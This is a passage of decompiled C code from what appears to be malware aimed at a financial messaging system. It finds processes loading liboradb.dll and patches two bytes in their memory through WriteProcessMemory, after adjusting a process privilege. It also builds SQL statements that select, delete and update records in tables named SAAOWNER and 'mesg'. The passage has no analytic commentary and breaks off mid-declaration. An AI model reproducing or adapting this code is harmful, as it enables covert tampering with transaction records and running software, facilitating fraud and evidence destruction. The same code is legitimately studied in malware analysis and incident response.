  while ( !sub_402080(lpFirst, v3) )
  {
    ++v2;
    v3 += 64;
    if ( v2 >= *(_DWORD *)(a2 + 4) )
      return -1;
  }
  return v2;
}

//----- (004020F0) --------------------------------------------------------
char *__cdecl sub_4020F0(int a1, int a2, char *a3, size_t Count)
{
  int v4; // esi
  unsigned int v5; // edi
  unsigned int v6; // ebx
  signed int v7; // ebp
  signed __int64 v8; // rax
  signed int v9; // esi
  signed __int64 v10; // rax
  char v11; // cl
  int v12; // esi
  char v13; // cl
  char v14; // al
  char *v15; // esi
  char *result; // eax
  signed __int64 v17; // [esp+8h] [ebp-8Ch]
  char Dest; // [esp+10h] [ebp-84h]
  char v19[3]; // [esp+11h] [ebp-83h]
  char v20[121]; // [esp+14h] [ebp-80h]
  __int16 v21; // [esp+8Dh] [ebp-7h]
  char v22; // [esp+8Fh] [ebp-5h]

  v4 = a1;
  v5 = a2;
  if ( a2 < 0 )
  {
    v4 = -a1;
    v5 = (unsigned __int64)-__PAIR__(a2, a1) >> 32;
  }
  v7 = (unsigned __int64)((signed __int64)__PAIR__(v5, v4) / 100) >> 32;
  v6 = (signed __int64)__PAIR__(v5, v4) / 100;
  v8 = (signed __int64)__PAIR__(v5, v4) % 100;
  v17 = (signed __int64)__PAIR__(v5, v4) % 100;
  Dest = 0;
  memset(v19, 0, 0x7Cu);
  v21 = 0;
  v22 = 0;
  v9 = 126;
  if ( v7 >= 0 && (v7 > 0 || v6) )
  {
    do
    {
      v9 -= 4;
      sprintf(&Dest + v9, a3d, __PAIR__(v7, v6) % 1000);
      if ( v9 != 122 )
        v20[v9] = 44;
      v10 = __PAIR__(v7, v6) / 1000;
      v7 = (unsigned __int64)(__PAIR__(v7, v6) / 1000) >> 32;
      v6 = v10;
    }
    while ( SHIDWORD(v10) > 0 || v10 >= 0 && (_DWORD)v10 );
    HIDWORD(v8) = HIDWORD(v17);
  }
  v11 = v19[v9];
  v12 = v9 + 1;
  if ( v11 == 48 )
  {
    do
      v13 = v19[v12++];
    while ( v13 == 48 );
  }
  v14 = *(&Dest + v12);
  v15 = &Dest + v12;
  if ( !v14 )
    return strcpy(a3, a000);
  if ( v8 >= 0 && (SHIDWORD(v8) > 0 || (_DWORD)v17) )
  {
    snprintf(a3, Count, aS2d, v15, (_DWORD)v17, HIDWORD(v8));
    result = a3;
  }
  else
  {
    snprintf(a3, Count, aS_0, v15);
    result = a3;
  }
  return result;
}
// 4020F0: using guessed type char var_83[3];
// 4020F0: using guessed type char var_80[121];

//----- (00402270) --------------------------------------------------------
__int64 __cdecl sub_402270(char *Src)
{
  char *v1; // esi
  signed int v2; // ebx
  char *v3; // ebp
  unsigned int i; // edx
  char v5; // al
  char v6; // al
  signed int v7; // ecx
  int v8; // ebx
  __int64 v9; // rax
  int v10; // edi
  char *v12; // [esp+10h] [ebp-2Ch]
  __int64 v13; // [esp+14h] [ebp-28h]
  char v14; // [esp+1Ch] [ebp-20h]
  char v15; // [esp+1Dh] [ebp-1Fh]
  __int16 v16; // [esp+39h] [ebp-3h]
  char v17; // [esp+3Bh] [ebp-1h]
  char Srca; // [esp+40h] [ebp+4h]

  v14 = 0;
  memset(&v15, 0, 0x1Cu);
  v16 = 0;
  v17 = 0;
  v1 = strdup(Src);
  v2 = 0;
  v12 = &v14;
  v3 = v1;
  Srca = 0;
  StrTrimA(v1, pszTrimChars);
  for ( i = strlen(v1) - 1; i >= strlen(v1) - 3; --i )
  {
    if ( v1[i] == 44 )
      v1[i] = 46;
  }
  if ( *v1 )
  {
    do
    {
      v5 = *v3;
      if ( *v3 != 44 )
      {
        if ( v5 == 46 )
        {
          Srca = 1;
        }
        else
        {
          if ( !isdigit(v5) )
            break;
          if ( Srca )
            ++v2;
          if ( v2 > 2 )
            break;
          *v12++ = *v3;
        }
      }
      v6 = (v3++)[1];
    }
    while ( v6 );
  }
  v13 = 0i64;
  sscanf(&v14, aI64d, &v13);
  v7 = v2;
  v8 = v2 + 1;
  if ( v7 < 2 )
  {
    v9 = v13;
    v10 = 3 - v8;
    do
    {
      v9 *= 10i64;
      --v10;
    }
    while ( v10 );
    v13 = v9;
  }
  free(v1);
  return v13;
}

//----- (004023B0) --------------------------------------------------------
signed int __cdecl sub_4023B0(int a1, _DWORD *a2, _DWORD *a3, int a4)
{
  signed int v4; // esi
  HANDLE v5; // eax
  void *v6; // edi
  HANDLE v7; // edi
  HANDLE v8; // eax
  void *v9; // esi
  BYTE *v10; // ST04_4
  HANDLE hSnapshot; // [esp+10h] [ebp-350h]
  PROCESSENTRY32 pe; // [esp+14h] [ebp-34Ch]
  MODULEENTRY32 me; // [esp+13Ch] [ebp-224h]

  me.dwSize = 0;
  memset(&me.th32ModuleID, 0, 0x220u);
  pe.dwSize = 0;
  memset(&pe.cntUsage, 0, 0x124u);
  v4 = -1;
  *a3 = 0;
  *a2 = 0;
  if ( sub_402660(Name, 1) )
  {
LABEL_19:
    v6 = hSnapshot;
    goto LABEL_20;
  }
  v5 = CreateToolhelp32Snapshot(2u, 0);
  v6 = v5;
  hSnapshot = v5;
  if ( v5 == (HANDLE)-1 )
    return v4;
  pe.dwSize = 296;
  if ( Process32First(v5, &pe) )
  {
    do
    {
      v7 = OpenProcess(0x1F0FFFu, 0, pe.th32ProcessID);
      if ( v7 )
      {
        v8 = CreateToolhelp32Snapshot(8u, pe.th32ProcessID);
        v9 = v8;
        if ( v8 != (HANDLE)-1 )
        {
          me.dwSize = 548;
          if ( Module32First(v8, &me) )
          {
            if ( StrStrIA(me.szModule, aLiboradbDll) )
            {
LABEL_10:
              v10 = me.modBaseAddr;
              ++*a2;
              if ( sub_402580(v7, (int)v10, a1) )
              {
                if ( a4 )
                  sub_401000(aFailS, pe.szExeFile);
              }
              else if ( a4 )
              {
                sub_401000(aOkS, pe.szExeFile);
                ++*a3;
              }
            }
            else
            {
              while ( Module32Next(v9, &me) )
              {
                if ( StrStrIA(me.szModule, aLiboradbDll) )
                  goto LABEL_10;
              }
            }
          }
          CloseHandle(v9);
        }
        CloseHandle(v7);
      }
    }
    while ( Process32Next(hSnapshot, &pe) );
    v4 = 0;
    goto LABEL_19;
  }
LABEL_20:
  if ( v6 != (void *)-1 )
    CloseHandle(v6);
  return v4;
}

//----- (00402580) --------------------------------------------------------
int __cdecl sub_402580(HANDLE hProcess, int Buffer, int a3)
{
  HANDLE v3; // edi
  void *v4; // esi
  void *v5; // ST04_4
  BOOL v6; // eax
  SIZE_T NumberOfBytesWritten; // [esp+10h] [ebp-Ch]
  SIZE_T NumberOfBytesRead; // [esp+14h] [ebp-8h]
  DWORD flOldProtect; // [esp+18h] [ebp-4h]

  v3 = hProcess;
  v4 = (void *)(Buffer + 436406);
  v5 = (void *)(Buffer + 436406);
  NumberOfBytesWritten = 0;
  NumberOfBytesRead = 0;
  LOWORD(Buffer) = 0;
  if ( !VirtualProtectEx(hProcess, v5, 2u, 0x40u, (PDWORD)&hProcess)
    || !ReadProcessMemory(v3, v4, &Buffer, 2u, &NumberOfBytesRead) )
  {
    return -1;
  }
  if ( a3 )
  {
    if ( (_WORD)Buffer != unk_40F174 )
      return -1;
    v6 = WriteProcessMemory(v3, v4, &unk_40F170, 2u, &NumberOfBytesWritten);
  }
  else
  {
    if ( (_WORD)Buffer != unk_40F170 )
      return -1;
    v6 = WriteProcessMemory(v3, v4, &unk_40F174, 2u, &NumberOfBytesWritten);
  }
  if ( !v6 )
    return -1;
  VirtualProtectEx(v3, v4, 2u, (DWORD)hProcess, &flOldProtect);
  return 0;
}

//----- (00402660) --------------------------------------------------------
int __cdecl sub_402660(LPCSTR lpName, int a2)
{
  HANDLE v2; // eax
  HANDLE TokenHandle; // [esp+0h] [ebp-1Ch]
  struct _LUID Luid; // [esp+4h] [ebp-18h]
  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-10h]

  v2 = GetCurrentProcess();
  if ( !OpenProcessToken(v2, 0x28u, &TokenHandle) )
    return -1;
  if ( LookupPrivilegeValueA(0, lpName, &Luid) )
  {
    NewState.Privileges[0].Luid = Luid;
    NewState.PrivilegeCount = 1;
    NewState.Privileges[0].Attributes = a2 != 0 ? 2 : 0;
    if ( AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0, 0) )
      GetLastError();
  }
  CloseHandle(TokenHandle);
  return 0;
}

//----- (00402710) --------------------------------------------------------
_DWORD *__fastcall sub_402710(int a1)
{
  _DWORD *result; // eax

  byte_411050 = HIBYTE(a1);
  result = operator new(0x18u);
  *result = result;
  result[1] = result;
  Memory = result;
  dword_411058 = 0;
  return result;
}
// 411050: using guessed type char byte_411050;
// 411058: using guessed type int dword_411058;

//----- (00402750) --------------------------------------------------------
int sub_402750()
{
  _DWORD *v0; // ebx
  _DWORD *v1; // edi
  _DWORD **v2; // esi
  int result; // eax

  v0 = Memory;
  v1 = *(_DWORD **)Memory;
  if ( *(void **)Memory != Memory )
  {
    do
    {
      v2 = (_DWORD **)v1;
      v1 = (_DWORD *)*v1;
      *v2[1] = *v2;
      (*v2)[1] = v2[1];
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(v2 + 2, 1);
      sub_40BC56(v2);
      --dword_411058;
    }
    while ( v1 != v0 );
  }
  sub_40BC56(Memory);
  result = 0;
  Memory = 0;
  dword_411058 = 0;
  return result;
}
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 411058: using guessed type int dword_411058;

//----- (004027C0) --------------------------------------------------------
signed int __cdecl sub_4027C0(int a1, int a2, int a3, int a4)
{
  CHAR First; // [esp+8h] [ebp-608h]
  char v6; // [esp+9h] [ebp-607h]
  __int16 v7; // [esp+109h] [ebp-507h]
  char v8; // [esp+10Bh] [ebp-505h]
  CHAR v9; // [esp+10Ch] [ebp-504h]
  char v10; // [esp+10Dh] [ebp-503h]
  __int16 v11; // [esp+20Dh] [ebp-403h]
  char v12; // [esp+20Fh] [ebp-401h]
  char Dest; // [esp+210h] [ebp-400h]
  char v14; // [esp+211h] [ebp-3FFh]
  __int16 v15; // [esp+60Dh] [ebp-3h]
  char v16; // [esp+60Fh] [ebp-1h]

  Dest = 0;
  memset(&v14, 0, 0x3FCu);
  v15 = 0;
  v16 = 0;
  v9 = 0;
  memset(&v10, 0, 0x100u);
  v11 = 0;
  v12 = 0;
  First = 0;
  memset(&v6, 0, 0x100u);
  v7 = 0;
  v8 = 0;
  snprintf(&Dest, 0x3FFu, aSelectCTextSUm, a1, a1, a2, a3, a4, a3, a4);
  if ( sub_408B70((int)&Dest, &First, 260) || !First )
    return -1;
  snprintf(&Dest, 0x3FFu, aDeleteFromSaao, a1, &First);
  sub_408B70((int)&Dest, &v9, 260);
  snprintf(&Dest, 0x3FFu, aDeleteFromSaao_0, a1, &First);
  sub_408B70((int)&Dest, &v9, 260);
  return 0;
}

//----- (00402900) --------------------------------------------------------
signed int __cdecl sub_402900(int a1, int a2, int a3)
{
  CHAR First; // [esp+8h] [ebp-608h]
  char v5; // [esp+9h] [ebp-607h]
  __int16 v6; // [esp+109h] [ebp-507h]
  char v7; // [esp+10Bh] [ebp-505h]
  CHAR v8; // [esp+10Ch] [ebp-504h]
  char v9; // [esp+10Dh] [ebp-503h]
  __int16 v10; // [esp+20Dh] [ebp-403h]
  char v11; // [esp+20Fh] [ebp-401h]
  char Dest; // [esp+210h] [ebp-400h]
  char v13; // [esp+211h] [ebp-3FFh]
  __int16 v14; // [esp+60Dh] [ebp-3h]
  char v15; // [esp+60Fh] [ebp-1h]

  Dest = 0;
  memset(&v13, 0, 0x3FCu);
  v14 = 0;
  v15 = 0;
  v8 = 0;
  memset(&v9, 0, 0x100u);
  v10 = 0;
  v11 = 0;
  First = 0;
  memset(&v5, 0, 0x100u);
  v6 = 0;
  v7 = 0;
  snprintf(&Dest, 0x3FFu, aSelectMesgSUmi, a1, a2, a3);
  if ( sub_408B70((int)&Dest, &First, 260) || !First )
    return -1;
  snprintf(&Dest, 0x3FFu, aDeleteFromSaao, a1, &First);
  sub_408B70((int)&Dest, &v8, 260);
  snprintf(&Dest, 0x3FFu, aDeleteFromSaao_0, a1, &First);
  sub_408B70((int)&Dest, &v8, 260);
  return 0;
}

//----- (00402A40) --------------------------------------------------------
int __cdecl sub_402A40(int a1, int a2, char *Source, int a4, int a5)
{
  CHAR First; // [esp+10h] [ebp-60410h]
  char v7; // [esp+11h] [ebp-6040Fh]
  char v8; // [esp+13h] [ebp-6040Dh]
  __int16 v9; // [esp+111h] [ebp-6030Fh]
  char v10; // [esp+113h] [ebp-6030Dh]
  CHAR v11; // [esp+114h] [ebp-6030Ch]
  char v12; // [esp+115h] [ebp-6030Bh]
  __int16 v13; // [esp+215h] [ebp-6020Bh]
  char v14; // [esp+217h] [ebp-60209h]
  char v15; // [esp+218h] [ebp-60208h]
  char v16; // [esp+219h] [ebp-60207h]
  __int16 v17; // [esp+319h] [ebp-60107h]
  char v18; // [esp+31Bh] [ebp-60105h]
  char v19; // [esp+31Ch] [ebp-60104h]
  char v20; // [esp+31Dh] [ebp-60103h]
  __int16 v21; // [esp+41Dh] [ebp-60003h]
  char v22; // [esp+41Fh] [ebp-60001h]
  char v23; // [esp+420h] [ebp-60000h]
  char v24; // [esp+421h] [ebp-5FFFFh]
  __int16 v25; // [esp+1041Dh] [ebp-50003h]
  char v26; // [esp+1041Fh] [ebp-50001h]
  char v27; // [esp+10420h] [ebp-50000h]
  char v28; // [esp+10421h] [ebp-4FFFFh]
  __int16 v29; // [esp+3041Dh] [ebp-30003h]
  char v30; // [esp+3041Fh] [ebp-30001h]
  char Dest; // [esp+30420h] [ebp-30000h]
  char v32; // [esp+30421h] [ebp-2FFFFh]
  __int16 v33; // [esp+6041Dh] [ebp-3h]
  char v34; // [esp+6041Fh] [ebp-1h]

  Dest = 0;
  v11 = 0;
  memset(&v32, 0, 0x2FFFCu);
  v33 = 0;
  v34 = 0;
  v23 = 0;
  memset(&v12, 0, 0x100u);
  v13 = 0;
  v14 = 0;
  v27 = 0;
  memset(&v24, 0, 0xFFFCu);
  v25 = 0;
  v26 = 0;
  First = 0;
  memset(&v28, 0, 0x1FFFCu);
  v29 = 0;
  v30 = 0;
  v19 = 0;
  memset(&v7, 0, 0x100u);
  v9 = 0;
  v10 = 0;
  v15 = 0;
  memset(&v20, 0, 0x100u);
  v21 = 0;
  v22 = 0;
  memset(&v16, 0, 0x100u);
  v17 = 0;
  v18 = 0;
  snprintf(&Dest, 0x2FFFFu, aSelectMesgFinC, a1, a2);
  if ( !sub_408B70((int)&Dest, &First, 260) && First )
  {
    v8 = 0;
    if ( !sub_40B6F0(Source, &v23, 0x10000) && !sub_40A4C0(&v23, &v27, 0x20000u) )
    {
      sub_40A7A0(a4, a5, &v19, 260);
      snprintf(&v15, 0x103u, aS19s, &First, &v19);
      snprintf(&Dest, 0x2FFFFu, aUpdateSaaowner, a1, &v15, a2);
      sub_408B70((int)&Dest, &v11, 260);
      snprintf(&Dest, 0x2FFFFu, aUpdateSaaowner_0, a1, &v27, a2);
      sub_408B70((int)&Dest, &v11, 260);
      return 0;
    }
    GetLastError();
  }
  return -1;
}

//----- (00402C90) --------------------------------------------------------
int __cdecl sub_402C90(int a1, int a2, int a3, int a4, char *Source, int a6, int a7)
{
  int result; // eax
  CHAR First; // [esp+8h] [ebp-504h]
  char v9; // [esp+9h] [ebp-503h]
  __int16 v10; // [esp+109h] [ebp-403h]
  char v11; // [esp+10Bh] [ebp-401h]
  char Dest; // [esp+10Ch] [ebp-400h]
  char v13; // [esp+10Dh] [ebp-3FFh]
  __int16 v14; // [esp+509h] [ebp-3h]
  char v15; // [esp+50Bh] [ebp-1h]

  Dest = 0;
  memset(&v13, 0, 0x3FCu);
  v14 = 0;
  v15 = 0;
  First = 0;
  memset(&v9, 0, 0x100u);
  v10 = 0;
  v11 = 0;
  snprintf(&Dest, 0x3FFu, aSelectCTextSUm, a4, a4, a1, a2, a3, a2, a3);
  if ( sub_408B70((int)&Dest, &First, 260) || !First )
    result = -1;
  else
    result = sub_402A40(a4, (int)&First, Source, a6, a7);
  return result;
}

//----- (00402D70) --------------------------------------------------------
int __cdecl sub_402D70(int a1, int a2, int a3, int a4, char *Source, int a6, int a7)
{
  int result; // eax
  CHAR First; // [esp+8h] [ebp-608h]
  char v9; // [esp+9h] [ebp-607h]
  __int16 v10; // [esp+109h] [ebp-507h]
  char v11; // [esp+10Bh] [ebp-505h]
  char v12; // [esp+10Ch] [ebp-504h]
  char v13; // [esp+10Dh] [ebp-503h]
  __int16 v14; // [esp+20Dh] [ebp-403h]
  char v15; // [esp+20Fh] [ebp-401h]
  char Dest; // [esp+210h] [ebp-400h]
  char v17; // [esp+211h] [ebp-3FFh]
  __int16 v18; // [esp+60Dh] [ebp-3h]
  char v19; // [esp+60Fh] [ebp-1h]

  Dest = 0;
  memset(&v17, 0, 0x3FCu);
  v18 = 0;
  v19 = 0;
  First = 0;
  memset(&v9, 0, 0x100u);
  v10 = 0;
  v11 = 0;
  v12 = 0;
  memset(&v13, 0, 0x100u);
  v14 = 0;
  v15 = 0;
  sub_40A7A0(a2, a3, &v12, 260);
  snprintf(&Dest, 0x3FFu, aSelectMesgSUmi_0, a4, a1, &v12);
  if ( sub_408B70((int)&Dest, &First, 260) || !First )
    result = -1;
  else
    result = sub_402A40(a4, (int)&First, Source, a6, a7);
  return result;
}

//----- (00402E80) --------------------------------------------------------
void sub_402E80(char *Format, ...)
{
  unsigned int v1; // kr04_4
  unsigned int v2; // ebp
  _DWORD *v3; // esi
  _DWORD *v4; // edi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *v7; // ecx
  char v8; // cl
  char v9; // [esp+Bh] [ebp-21Dh]
  char v10; // [esp+Ch] [ebp-21Ch]
  char *v11; // [esp+10h] [ebp-218h]
  unsigned int v12; // [esp+14h] [ebp-214h]
  int v13; // [esp+18h] [ebp-210h]
  char DstBuf; // [esp+1Ch] [ebp-20Ch]
  char v15; // [esp+1Dh] [ebp-20Bh]
  __int16 v16; // [esp+219h] [ebp-Fh]
  char v17; // [esp+21Bh] [ebp-Dh]
  int v18; // [esp+224h] [ebp-4h]
  va_list va; // [esp+230h] [ebp+8h]

  va_start(va, Format);
  DstBuf = 0;
  memset(&v15, 0, 0x1FCu);
  v16 = 0;
  v17 = 0;
  vsnprintf(&DstBuf, 0x1FFu, Format, va);
  if ( szServerName )
  {
    EnterCriticalSection(&CriticalSection);
    v10 = v9;
    v1 = strlen(&DstBuf) + 1;
    v11 = 0;
    v2 = v1 - 1;
    v12 = 0;
    v13 = 0;
    if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(&v10, v1 - 1, 1) )
    {
      qmemcpy(v11, &DstBuf, v2);
      v12 = v1 - 1;
      v11[v2] = 0;
    }
    v3 = Memory;
    v18 = 0;
    v4 = (_DWORD *)*((_DWORD *)Memory + 1);
    v5 = operator new(0x18u);
    v6 = v3;
    if ( !v3 )
      v6 = v5;
    *v5 = v6;
    v7 = v4;
    if ( !v4 )
      v7 = v5;
    v5[1] = v7;
    v3[1] = v5;
    *(_DWORD *)v5[1] = v5;
    sub_40A2E0((int)(v5 + 2), &v10);
    ++dword_411058;
    LeaveCriticalSection(&CriticalSection);
    v18 = -1;
    if ( v11 )
    {
      v8 = *(v11 - 1);
      if ( v8 && v8 != -1 )
        *(v11 - 1) = v8 - 1;
      else
        sub_40BC56(v11 - 1);
    }
    v11 = 0;
    v12 = 0;
    v13 = 0;
  }
  if ( !byte_4195C8 && !byte_4195C9 )
    sub_401000(aS_1, &DstBuf);
}
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);
// 411058: using guessed type int dword_411058;
// 4195C8: using guessed type char byte_4195C8;
// 4195C9: using guessed type char byte_4195C9;

//----- (00403020) --------------------------------------------------------
void __cdecl sub_403020(char *Dest, int a2)
{
  char *v2; // eax
  char v3; // cl
  _DWORD *v4; // esi
  char *v5; // eax
  char v6; // al
  char v7; // [esp+4h] [ebp-1Ch]
  char *Source; // [esp+8h] [ebp-18h]
  int v9; // [esp+Ch] [ebp-14h]
  int v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+1Ch] [ebp-4h]

  if ( szServerName )
  {
    memset(Dest, 0, a2);
    EnterCriticalSection(&CriticalSection);
    if ( dword_411058 )
    {
      v2 = (char *)(*(_DWORD *)Memory + 8);
      v3 = *v2;
      Source = 0;
      v7 = v3;
      v9 = 0;
      v10 = 0;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(
        &v7,
        v2,
        0,
        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::npos);
      v11 = 0;
      v4 = *(_DWORD **)Memory;
      **(_DWORD **)(*(_DWORD *)Memory + 4) = **(_DWORD **)Memory;
      *(_DWORD *)(*v4 + 4) = v4[1];
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>(
        v4 + 2,
        0);
      sub_40BC56(v4);
      v5 = Source;
      --dword_411058;
      if ( !Source )
        v5 = (char *)`std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Nullstr'::`2'::_C;
      strncpy(Dest, v5, a2 - 1);
      if ( Source )
      {
        v6 = *(Source - 1);
        if ( v6 && v6 != -1 )
          *(Source - 1) = v6 - 1;
        else
          sub_40BC56(Source - 1);
      }
    }
    LeaveCriticalSection(&CriticalSection);
  }
}
// 40D114: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::assign(_DWORD, _DWORD, _DWORD, _DWORD);
// 411058: using guessed type int dword_411058;

//----- (00403150) --------------------------------------------------------
int __cdecl sub_403150(char *FullPath)
{
  int result; // eax
  char Filename; // [esp+4h] [ebp-104h]
  char v3; // [esp+5h] [ebp-103h]
  __int16 v4; // [esp+105h] [ebp-3h]
  char v5; // [esp+107h] [ebp-1h]

  Filename = 0;
  memset(&v3, 0, 0x100u);
  v4 = 0;
  v5 = 0;
  splitpath(FullPath, 0, 0, &Filename, 0);
  if ( strlen(&Filename) == 8 )
    result = (unsigned __int16)(strtol(&Filename, 0, 10) % 10000);
  else
    result = 0;
  return result;
}

//----- (004031D0) --------------------------------------------------------
int __cdecl sub_4031D0(int a1, int a2)
{
  int result; // eax
  char Dest[4]; // [esp+8h] [ebp-10h]
  int v4; // [esp+Dh] [ebp-Bh]
  int v5; // [esp+11h] [ebp-7h]
  __int16 v6; // [esp+15h] [ebp-3h]
  char v7; // [esp+17h] [ebp-1h]

  result = 0;
  if ( strlen((const char *)a1) >= 8 )
  {
    Dest[0] = 0;
    *(_DWORD *)&Dest[1] = 0;
    v4 = 0;
    v5 = 0;
    v6 = 0;
    v7 = 0;
    sprintf(Dest, a04d, a2);
    result = *(_DWORD *)Dest;
    *(_DWORD *)(a1 + 4) = *(_DWORD *)Dest;
  }
  return result;
}

//----- (00403230) --------------------------------------------------------
int __cdecl sub_403230(char *Dir)
{
  int v1; // esi
  HANDLE v2; // edi
  int v4; // eax
  char Path; // [esp+Ch] [ebp-244h]
  char v6; // [esp+Dh] [ebp-243h]
  __int16 v7; // [esp+10Dh] [ebp-143h]
  char v8; // [esp+10Fh] [ebp-141h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+110h] [ebp-140h]

  Path = 0;
  memset(&v6, 0, 0x100u);
  v7 = 0;
  v8 = 0;
  v1 = 0;
  makepath(&Path, 0, Dir, asc_40F55C, aPrt_0);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  v2 = FindFirstFileA(&Path, &FindFileData);
  if ( v2 == (HANDLE)-1 )
    return 0;
  do
  {
    v4 = sub_403150(FindFileData.cFileName);
    if ( v1 < v4 )
      v1 = v4;
  }
  while ( FindNextFileA(v2, &FindFileData) );
  FindClose(v2);
  return v1;
}

//----- (004032F0) --------------------------------------------------------
int __cdecl sub_4032F0(char *Dir)
{
  signed int v1; // esi
  HANDLE v2; // ebp
  int v4; // eax
  struct _WIN32_FIND_DATAA FindFileData; // [esp+Ch] [ebp-244h]
  char Path; // [esp+14Ch] [ebp-104h]
  char v7; // [esp+14Dh] [ebp-103h]
  __int16 v8; // [esp+24Dh] [ebp-3h]
  char v9; // [esp+24Fh] [ebp-1h]

  Path = 0;
  memset(&v7, 0, 0x100u);
  v8 = 0;
  v9 = 0;
  v1 = 0x7FFFFFFF;
  makepath(&Path, 0, Dir, Ext, Ext);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  v2 = FindFirstFileA(&Path, &FindFileData);
  if ( v2 == (HANDLE)-1 )
    return 0;
  do
  {
    if ( !(FindFileData.dwFileAttributes & 0x10) && strlen(FindFileData.cFileName) == 4 )
    {
      v4 = strtol(FindFileData.cFileName, 0, 10);
      if ( v4 )
      {
        if ( v1 > v4 )
          v1 = v4;
      }
    }
  }
  while ( FindNextFileA(v2, &FindFileData) );
  FindClose(v2);
  return v1;
}

//----- (004033E0) --------------------------------------------------------
DWORD __cdecl sub_4033E0(int a1, LPCSTR lpString)
{
  int v2; // ebx
  DWORD v3; // esi
  const char *v5; // [esp-10h] [ebp-5C0h]
  int v6; // [esp-8h] [ebp-5B8h]
  LPCSTR v7; // [esp-4h] [ebp-5B4h]
  char v8; // [esp+10h] [ebp-5A0h]
  char v9; // [esp+11h] [ebp-59Fh]
  char v10; // [esp+12h] [ebp-59Eh]
  char v11; // [esp+13h] [ebp-59Dh]
  char v12; // [esp+14h] [ebp-59Ch]
  char v13; // [esp+15h] [ebp-59Bh]
  char v14; // [esp+16h] [ebp-59Ah]
  char v15; // [esp+17h] [ebp-599h]
  char v16; // [esp+18h] [ebp-598h]
  char v17; // [esp+19h] [ebp-597h]
  char v18; // [esp+1Ah] [ebp-596h]
  char v19; // [esp+1Bh] [ebp-595h]
  char v20; // [esp+1Ch] [ebp-594h]
  char v21; // [esp+1Dh] [ebp-593h]
  char v22; // [esp+1Eh] [ebp-592h]
  char v23; // [esp+1Fh] [ebp-591h]
  char v24; // [esp+20h] [ebp-590h]
  char v25; // [esp+21h] [ebp-58Fh]
  char v26; // [esp+22h] [ebp-58Eh]
  char v27; // [esp+23h] [ebp-58Dh]
  char v28; // [esp+24h] [ebp-58Ch]
  char v29; // [esp+25h] [ebp-58Bh]
  char v30; // [esp+26h] [ebp-58Ah]
  char v31; // [esp+27h] [ebp-589h]
  char v32; // [esp+28h] [ebp-588h]
  char v33; // [esp+29h] [ebp-587h]
  char v34; // [esp+2Ah] [ebp-586h]
  char v35; // [esp+2Bh] [ebp-585h]
  char v36; // [esp+2Ch] [ebp-584h]
  char v37; // [esp+2Dh] [ebp-583h]
  char v38; // [esp+2Eh] [ebp-582h]
  char v39; // [esp+2Fh] [ebp-581h]
  char v40; // [esp+30h] [ebp-580h]
  char v41; // [esp+31h] [ebp-57Fh]
  char v42; // [esp+32h] [ebp-57Eh]
  char v43; // [esp+33h] [ebp-57Dh]
  char v44; // [esp+34h] [ebp-57Ch]
  char v45; // [esp+35h] [ebp-57Bh]
  char v46; // [esp+36h] [ebp-57Ah]
  char v47; // [esp+37h] [ebp-579h]
  char v48; // [esp+38h] [ebp-578h]
  char v49; // [esp+39h] [ebp-577h]
  char v50; // [esp+3Ah] [ebp-576h]
  char v51; // [esp+3Bh] [ebp-575h]
  char v52; // [esp+3Ch] [ebp-574h]
  char v53; // [esp+3Dh] [ebp-573h]
  char v54; // [esp+3Eh] [ebp-572h]
  char v55; // [esp+3Fh] [ebp-571h]
  char v56; // [esp+40h] [ebp-570h]
  char v57; // [esp+41h] [ebp-56Fh]
  char v58; // [esp+42h] [ebp-56Eh]
  char v59; // [esp+43h] [ebp-56Dh]
  char v60; // [esp+44h] [ebp-56Ch]
  char v61; // [esp+45h] [ebp-56Bh]
  char v62; // [esp+46h] [ebp-56Ah]
  char v63; // [esp+47h] [ebp-569h]
  char v64; // [esp+48h] [ebp-568h]
  char v65; // [esp+49h] [ebp-567h]
  char v66; // [esp+4Ah] [ebp-566h]
  char v67; // [esp+4Bh] [ebp-565h]
  char v68; // [esp+4Ch] [ebp-564h]
  char v69; // [esp+4Dh] [ebp-563h]
  char v70; // [esp+4Eh] [ebp-562h]
  char v71; // [esp+4Fh] [ebp-561h]
  char v72; // [esp+50h] [ebp-560h]
  char v73; // [esp+51h] [ebp-55Fh]
  char v74; // [esp+52h] [ebp-55Eh]
  char v75; // [esp+53h] [ebp-55Dh]
  char v76; // [esp+54h] [ebp-55Ch]
  char v77; // [esp+55h] [ebp-55Bh]
  char v78; // [esp+56h] [ebp-55Ah]
  char v79; // [esp+57h] [ebp-559h]
  char v80; // [esp+58h] [ebp-558h]
  char v81; // [esp+59h] [ebp-557h]
  char v82; // [esp+5Ah] [ebp-556h]
  char v83; // [esp+5Bh] [ebp-555h]
  char v84; // [esp+5Ch] [ebp-554h]
  char v85; // [esp+5Dh] [ebp-553h]
  char v86; // [esp+5Eh] [ebp-552h]
  char v87; // [esp+5Fh] [ebp-551h]
  char v88; // [esp+60h] [ebp-550h]
  char v89; // [esp+61h] [ebp-54Fh]
  char v90; // [esp+62h] [ebp-54Eh]
  char v91; // [esp+63h] [ebp-54Dh]
  char v92; // [esp+64h] [ebp-54Ch]
  char v93; // [esp+65h] [ebp-54Bh]
  char v94; // [esp+66h] [ebp-54Ah]
  char v95; // [esp+67h] [ebp-549h]
  char v96; // [esp+68h] [ebp-548h]
  char v97; // [esp+69h] [ebp-547h]
  char v98; // [esp+6Ah] [ebp-546h]
  char v99; // [esp+6Bh] [ebp-545h]
  char v100; // [esp+6Ch] [ebp-544h]
